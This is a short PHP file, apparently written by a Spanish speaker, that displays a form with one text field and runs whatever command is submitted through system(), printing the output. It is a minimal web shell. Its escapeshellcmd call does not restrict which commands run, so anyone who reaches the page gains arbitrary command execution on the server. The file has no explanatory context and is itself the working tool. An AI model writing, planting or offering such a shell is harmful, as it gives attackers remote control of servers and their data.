<?php
if($_SERVER['REQUEST_METHOD']){

    $cmd = escapeshellcmd($_POST['cmd']);
    var_dump($cmd);
    echo "<pre>";
    $comando = system($cmd, $return);
    echo "</pre>";
}
?>
<form method="POST">
    <input type="text" name="cmd">
    <button type="submit">ENVIAR</button>
</form>
